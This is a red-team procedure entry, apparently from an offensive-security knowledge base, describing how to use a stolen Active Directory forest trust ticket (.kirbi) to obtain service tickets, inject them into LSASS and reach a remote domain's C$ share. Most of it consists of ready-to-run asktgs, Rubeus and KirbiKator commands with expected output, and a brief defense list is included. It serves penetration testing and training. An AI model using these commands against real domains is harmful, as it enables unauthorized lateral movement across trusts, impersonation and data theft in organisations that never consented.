---
type: procedure
tactics:
  - '[[Defense Evasion]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Indirect Command Execution]]'
  - '[[Pass the Ticket]]'
sub_techniques: []
tags:
  - active-directory-attacks
  - forest-to-forest-compromise-trust-ticket
  - use-trust-ticket-to-get-st-for-targeted-service
commands:
  - '[[commands/asktgs-retrieve-tgs-for-cifs]]'
  - '[[commands/rubeus-asktgs-for-ldap-and-ptt]]'
  - '[[commands/kirbikator-inject-ticket-to-lsa]]'
  - '[[commands/ls-access-remote-share]]'
platforms:
  - Windows
tools:
  - '[[tools/asktgs]]'
  - '[[tools/Rubeus]]'
  - '[[tools/KirbiKator]]'
skill_level: advanced
impact_level: high
detection_risk: high
verified: true
validated: true
---

# forest-to-forest-compromise-trust-ticket-tgs-retrieval-and-ldap-authentication

## Summary

This procedure demonstrates how to use a Trust Ticket file, which contains the encrypted hash of the trust password between two Active Directory forests, to retrieve a Ticket Granting Service (TGS) ticket for a targeted service and then authenticate via LDAP. It enables lateral movement across forest trusts by injecting the ticket and accessing remote resources, such as domain controllers or file shares, without valid credentials in the target forest.

## Description

In Active Directory environments with forest trusts, attackers who have obtained a Trust Ticket (often via prior compromise or extraction from LSASS) can exploit the trust relationship to impersonate inter-forest principals. The process involves requesting a TGS ticket using the trust credentials for a specific service (e.g., CIFS or LDAP), injecting it into the current session, and then using it to authenticate and access resources in the target forest. This technique leverages Kerberos protocols to bypass direct authentication, allowing access to sensitive data or systems across trust boundaries. It is particularly effective in multi-forest setups where trust passwords are weak or extractable. Prerequisites include domain-joined access in the source forest and the Trust Ticket file. Success grants spoofed rights for operations like directory queries or file access in the target forest.

## Requirements

1. A valid Trust Ticket file (.kirbi format) containing the encrypted trust password hash between the two forests.
2. Knowledge of the target service (e.g., CIFS/machine.domain.local or LDAP/dc.domain.local) and domain controller hostname.
3. Administrative or domain user access in the source forest to execute tools and inject tickets.
4. Tools installed: asktgs.exe, Rubeus.exe, and KirbiKator.exe.
5. Windows environment with PowerShell or Command Prompt access.

## Defense

- Limit access to Trust Ticket files by restricting LSASS dumps and credential extraction tools via AppLocker or WDAC.
- Use strong, unique passwords for inter-forest trust relationships and rotate them regularly.
- Implement network segmentation with firewalls to restrict lateral movement between forests, blocking unauthorized Kerberos traffic (ports 88, 445).
- Enable advanced auditing for Kerberos events (Event ID 4769 for TGS requests) and monitor for anomalous ticket usage across trusts.
- Deploy tools like Microsoft Defender for Identity to detect pass-the-ticket and trust exploitation attempts.

## Objectives

1. Retrieve a TGS ticket using the Trust Ticket for the target service to establish Kerberos authentication across forests.
2. Inject the TGS ticket into the current session for pass-the-ticket impersonation.
3. Authenticate via LDAP or access remote shares in the target forest to exfiltrate data or escalate privileges.
4. Achieve lateral movement to sensitive resources like domain controllers without native credentials.

## Instructions

### Step 1: Retrieve TGS Ticket for CIFS Service

**Context**: Use the Trust Ticket to request a TGS ticket specifically for the CIFS service on the target machine, enabling file share access across the forest trust. This step generates the ticket file needed for subsequent injection and authentication.

**Command** ([[commands/asktgs-retrieve-tgs-for-cifs]]):

```powershell
.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
```

> This command invokes asktgs.exe with the Trust Ticket path and the service principal (CIFS/machine.domain.local), outputting a .kirbi TGS ticket file. Verify the ticket is created in the specified directory without errors like 'KRB_ERROR' in the output, indicating successful encryption using the trust hash.

### Step 2: Request TGS for LDAP and Pass-the-Ticket

**Context**: Using the retrieved or existing TGS ticket, request an LDAP-specific TGS and inject it into the current session with Rubeus. This allows LDAP binds to the target domain controller, facilitating directory queries or authentication in the foreign forest.

**Command** ([[commands/rubeus-asktgs-for-ldap-and-ptt]]):

```powershell
.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

> Rubeus requests the LDAP TGS using the provided ticket, targets the specified DC, and uses /ptt to import it into memory (LSASS). Expected output includes '[+] Ticket successfully imported' and no Kerberos errors. Confirm with klist to see the ticket in the session.

### Step 3: Inject Ticket into LSASS for Impersonation

**Context**: If not already injected via Rubeus, use KirbiKator to manually load the TGS ticket into the LSASS process. This ensures the current session impersonates the trust principal, spoofing rights for cross-forest operations.

**Command** ([[commands/kirbikator-inject-ticket-to-lsa]]):

```powershell
kirbikator lsa .\ticket.kirbi
```

> The 'lsa' option targets LSASS for injection. Output should confirm successful load without access denied errors. This step is conditional if prior PTT failed; always verify injection with tools like Mimikatz's 'sekurlsa::tickets'.

### Step 4: Access Remote Resources with Spoofed Rights

**Context**: With the ticket injected, test access to target resources like remote C$ shares using the impersonated credentials. This validates the compromise and enables data exfiltration or further movement.

**Command** ([[commands/ls-access-remote-share]]):

```powershell
ls \\machine.domain.local\c$
```

> The 'ls' command (alias for dir in PowerShell) lists the remote admin share. Success shows directory contents without authentication prompts. If access denied, recheck ticket validity with klist and ensure the service principal matches.
